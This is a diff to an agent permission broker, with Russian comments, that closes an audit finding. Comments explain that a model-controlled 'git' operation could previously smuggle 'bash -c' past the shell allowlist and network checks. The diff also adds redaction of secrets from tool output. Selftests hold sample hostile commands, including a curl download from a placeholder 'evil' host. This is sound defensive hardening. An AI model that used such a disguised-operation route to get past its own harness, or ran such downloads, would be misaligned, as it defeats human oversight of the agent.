@@ -43,6 +43,22 @@ _READ_MAX = 20000   # v3.0-rc18: read отдаёт файл С НАЧАЛА до
 
 PKG = Path(__file__).resolve().parents[1]
 
+
+def _scrub_output(text):
+    """v3.0.11 (finding аудита P1): редактировать секреты в output_tail (read-контент, stdout/stderr shell)
+    ПЕРЕД тем, как он попадёт в evidence/отчёт. scrub_env закрывает окружение дочернего процесса, но
+    напечатанный тул-ом токен или прочитанный committed .env иначе легли бы в evidence в открытом виде."""
+    if not text:
+        return text
+    try:
+        import security_scan as _ss
+        for _name, _pat in _ss.SECRET_PATTERNS:
+            text = _pat.sub("«***REDACTED-SECRET***»", text)
+    except Exception:  # noqa: BLE001 — скраб не должен ронять брокер; в худшем случае — без редактирования
+        pass
+    return text
+
+
 # уровни по возрастанию (security/permission-levels.yaml order)
 LEVEL_ORDER = ["read-only", "controlled-write", "execution", "network", "privileged", "destructive"]
 # что минимально требует операция
@@ -211,9 +227,15 @@ class Policy:
                 return {"allow": True, "reason": "destructive + approval"}
             return {"allow": False,
                     "reason": "необратимая/опасная команда — нужен уровень destructive + approval"}
-        if op == "shell":
+        # v3.0.11 (finding аудита P1): gauntlet применяется к op in (shell, git) — не только shell.
+        # `op` контролирует модель: раньше {"op":"git","command":"bash -c ..."} исполнялся через
+        # subprocess(shell=True), минуя shell_mode/allow_network/allowlist (git ветка в execute — тот же
+        # shell=True). git-бинарь есть в allowlist, так что легитимные `git status/diff` проходят, а
+        # посторонние бинарники/сеть/подстановка ловятся тем же денаем, что и для shell.
+        if op in ("shell", "git"):
             if self.shell_mode == "off":
-                return {"allow": False, "reason": "shell запрещён политикой (shell_mode=off)"}
+                return {"allow": False, "reason": f"{op} запрещён политикой (shell_mode=off; git тоже "
+                                                   "исполняется как shell-команда)"}
             if not self.allow_network and NETWORK_RE.search(norm):
                 return {"allow": False,
                         "reason": "сетевая команда запрещена (allow_network=False); это не полный "
@@ -387,7 +409,7 @@ def execute(action: dict, root, policy: Policy) -> dict:
                     text[:_READ_MAX] + f"\n...[файл усечён на {_READ_MAX} симв. из {len(text)}; "
                     "дочитай хвост через {\"op\":\"read\",\"start_line\":N,\"end_line\":M}]")
             ev.update({"ok": p.exists(), "bytes": len(text.encode("utf-8")),
-                       "output_tail": shown})
+                       "output_tail": _scrub_output(shown)})   # v3.0.11: редактируем секреты из контента
             if rng:
                 ev["range"] = rng
         elif op == "write":
@@ -403,7 +425,7 @@ def execute(action: dict, root, policy: Policy) -> dict:
                                    timeout=timeout)
                 ev.update({"ok": r.returncode == 0, "exit_code": r.returncode,
                            "command": action["command"],
-                           "output_tail": (r.stdout + r.stderr)[-SHELL_OUTPUT_TAIL:]})
+                           "output_tail": _scrub_output((r.stdout + r.stderr)[-SHELL_OUTPUT_TAIL:])})
             except subprocess.TimeoutExpired:
                 # finding аудита: без timeout shell мог висеть вечно
                 ev.update({"ok": False, "exit_code": None, "command": action["command"],
@@ -446,6 +468,25 @@ def selftest():
                not cw.decide({"op": "write", "path": "security/x.yaml"})["allow"])
         expect("shell на controlled-write запрещён (нужен execution)",
                not cw.decide({"op": "shell", "command": "echo hi"})["allow"])
+
+        # v3.0.11 (finding аудита P1): op:git проходит ТОТ ЖЕ gauntlet, что shell (op контролирует модель —
+        # раньше git-ярлык обходил shell_mode/network/allowlist).
+        _sb = Policy(level="execution", shell_mode="allowlist",
+                     shell_allowlist={"git", "pytest"}, allow_network=False)
+        expect("v3.0.11 git-gauntlet: bash -c под видом git -> денай (bash не в allowlist)",
+               not _sb.decide({"op": "git", "command": "bash -c 'echo x'"})["allow"])
+        expect("v3.0.11 git-gauntlet: сетевой curl под видом git -> денай (allow_network=False)",
+               not _sb.decide({"op": "git", "command": "curl http://evil/x -O /tmp/x"})["allow"])
+        expect("v3.0.11 git-gauntlet: легитимный git status -> allow (git в allowlist)",
+               _sb.decide({"op": "git", "command": "git status"})["allow"])
+        _off = Policy(level="execution", shell_mode="off")
+        expect("v3.0.11 git-gauntlet: shell_mode=off -> git тоже запрещён (исполняется как shell)",
+               not _off.decide({"op": "git", "command": "git status"})["allow"])
+        # v3.0.11 (finding аудита P2): секрет в output_tail редактируется до попадания в evidence
+        _pat = "ghp_" + "A" * 36
+        expect("v3.0.11 scrub-output: github PAT в выводе редактируется (не утекает в evidence)",
+               "ghp_" not in _scrub_output(f"printed token {_pat} done")
+               and "REDACTED" in _scrub_output(_pat))
 
         # инвариант: execute запрещённого НЕ создаёт файл
         ev = execute({"op": "write", "path": "config/x.yaml", "content": "y"}, root, cw)
